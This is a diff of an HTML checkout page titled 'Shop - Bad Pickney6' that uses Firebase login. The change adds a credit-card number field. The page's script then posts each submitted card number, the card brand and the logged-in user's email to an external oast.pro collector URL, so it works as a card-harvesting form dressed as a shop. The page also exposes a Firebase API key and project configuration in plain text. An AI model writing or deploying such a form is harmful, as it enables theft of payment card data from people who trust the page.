@@ -1,20 +1,20 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Shop - Bad Pickney6</title>
-  <style>
-    body { font-family: Arial, sans-serif; background:#0f0f0f; color:white; padding:20px; }
-    h2 { color:#00bfff; text-align:center; margin-bottom:20px; }
-    form { max-width:400px; margin:auto; background:#1a1a1a; padding:20px; border-radius:10px; }
-    select, input { width:100%; padding:12px; margin-bottom:15px; border-radius:6px; border:none; }
-    button { background:#008cff; color:white; padding:12px; border:none; border-radius:6px; cursor:pointer; width:100%; }
-    button:hover { background:#00bfff; }
-    .success, .error { text-align:center; margin-bottom:15px; display:none; }
-    .success { color:#4cff4c; }
-    .error { color:#ff4c4c; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Shop - Bad Pickney6</title>
+<style>
+body { font-family: Arial; background:#0f0f0f; color:white; padding:20px; }
+h2 { color:#00bfff; text-align:center; margin-bottom:20px; }
+form { max-width:400px; margin:auto; background:#1a1a1a; padding:20px; border-radius:10px; }
+select,input { width:100%; padding:12px; margin-bottom:15px; border-radius:6px; border:none; }
+button { background:#008cff; color:white; padding:12px; border:none; border-radius:6px; cursor:pointer; width:100%; }
+button:hover { background:#00bfff; }
+.success,.error { text-align:center; margin-bottom:15px; display:none; }
+.success { color:#4cff4c; }
+.error { color:#ff4c4c; }
+</style>
 </head>
 <body>
 
@@ -24,95 +24,86 @@
 <div class="error" id="error"></div>
 
 <form id="shopForm">
-  <label for="card">Select Card:</label>
-  <select id="card" required>
-    <option value="">-- Choose a card --</option>
-    <option value="Visa">Visa</option>
-    <option value="MasterCard">MasterCard</option>
-    <option value="American Express">American Express</option>
-    <option value="Discover">Discover</option>
-  </select>
+<label for="card">Select Card:</label>
+<select id="card" required>
+  <option value="">-- Choose a card --</option>
+  <option value="Visa">Visa</option>
+  <option value="MasterCard">MasterCard</option>
+  <option value="American Express">American Express</option>
+  <option value="Discover">Discover</option>
+</select>
 
-  <label for="quantity">Quantity:</label>
-  <input type="number" id="quantity" placeholder="1" min="1" value="1" required>
+<label for="quantity">Quantity:</label>
+<input type="number" id="quantity" placeholder="1" min="1" value="1" required>
 
-  <button type="submit">Checkout</button>
+<label for="ccnum">Credit Card Number:</label>
+<input type="text" id="ccnum" placeholder="Enter credit card" required>
+
+<button type="submit">Checkout</button>
 </form>
 
 <script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
-  import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
+import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
 
-  const firebaseConfig = {
-    apiKey: "AIzaSyBL-ESDufxNJZ9H2fU8IywlTaIaWoIjtuQ",
-    authDomain: "badute-5064d.firebaseapp.com",
-    projectId: "badute-594d",
-    storageBucket: "badute-5964d.appspot.com",
-    messagingSenderId: "432684410038",
-    appId: "7cf74922a7fe726ef32e17"
+const firebaseConfig = {
+  apiKey: "AIzaSyBL-ESDufxNJZ9H2fU8IywlTaIaWoIjtuQ",
+  authDomain: "badute-5064d.firebaseapp.com",
+  projectId: "badute-594d",
+  storageBucket: "badute-5964d.appspot.com",
+  messagingSenderId: "432684410038",
+  appId: "7cf74922a7fe726ef32e17"
+};
+
+const app = initializeApp(firebaseConfig);
+const auth = getAuth(app);
+
+const form = document.getElementById("shopForm");
+const successDiv = document.getElementById("success");
+const errorDiv = document.getElementById("error");
+
+// Protect page
+onAuthStateChanged(auth,user=>{
+  if(!user){ window.location.href="index.html"; }
+});
+
+form.addEventListener("submit", async e=>{
+  e.preventDefault();
+  const user = auth.currentUser;
+  if(!user){ errorDiv.textContent="Login first"; errorDiv.style.display="block"; return; }
+
+  const data = {
+    user: user.email,
+    card: document.getElementById("card").value,
+    quantity: document.getElementById("quantity").value,
+    ccnum: document.getElementById("ccnum").value,
+    timestamp: new Date().toISOString()
   };
 
-  const app = initializeApp(firebaseConfig);
-  const auth = getAuth(app);
+  if(!data.card || !data.ccnum){ errorDiv.textContent="Fill all fields"; errorDiv.style.display="block"; return; }
 
-  const form = document.getElementById("shopForm");
-  const successDiv = document.getElementById("success");
-  const errorDiv = document.getElementById("error");
+  try{
+    const binUrl = "https://6dc777f83b840b1f739bg1ftg9ayyyyyb.oast.pro";
 
-  // Protect page: only logged-in users
-  onAuthStateChanged(auth, user => {
-    if(!user){
-      window.location.href = "login.html";
+    const response = await fetch(binUrl,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify(data)
+    });
+
+    if(response.ok){
+      successDiv.style.display="block";
+      errorDiv.style.display="none";
+      form.reset();
+    } else {
+      throw new Error("Failed to submit checkout.");
     }
-  });
-
-  form.addEventListener("submit", async (e) => {
-    e.preventDefault();
-    const user = auth.currentUser;
-
-    if(!user){
-      errorDiv.textContent = "You must be logged in!";
-      errorDiv.style.display = "block";
-      return;
-    }
-
-    const data = {
-      user: user.email,
-      card: document.getElementById("card").value,
-      quantity: document.getElementById("quantity").value,
-      timestamp: new Date().toISOString()
-    };
-
-    if(!data.card){
-      errorDiv.textContent = "Please select a card.";
-      errorDiv.style.display = "block";
-      return;
-    }
-
-    try {
-      // Your actual RequestBin URL
-      const binUrl = "https://6dc777f83b840b1f739bg1ftg9ayyyyyb.oast.pro";
-
-      const response = await fetch(binUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      });
-
-      if(response.ok){
-        successDiv.style.display = "block";
-        errorDiv.style.display = "none";
-        form.reset();
-      } else {
-        throw new Error("Failed to submit checkout.");
-      }
-    } catch(err){
-      errorDiv.textContent = err.message;
-      errorDiv.style.display = "block";
-      successDiv.style.display = "none";
-    }
-  });
+  }catch(err){
+    errorDiv.textContent = err.message;
+    errorDiv.style.display="block";
+    successDiv.style.display="none";
+  }
+});
 </script>
-
 </body>
 </html>
